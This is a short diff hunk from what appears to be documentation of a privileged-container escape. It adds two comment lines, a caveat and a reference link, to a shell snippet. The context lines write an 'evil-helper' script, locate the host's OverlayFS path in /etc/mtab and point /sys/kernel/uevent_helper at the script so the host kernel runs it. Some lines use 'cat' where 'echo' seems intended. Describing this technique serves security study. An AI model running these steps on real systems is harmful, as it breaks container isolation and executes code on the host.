@@ -97,6 +97,8 @@ cat "#!/bin/sh" > /evil-helper
 cat "ps > /output" >> /evil-helper
 chmod +x /evil-helper
 # Finds path of OverlayFS mount for container
+# Unless the configuration explicitly exposes the mount point of the host filesystem
+# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 # Sets uevent_helper to /path/payload
 echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
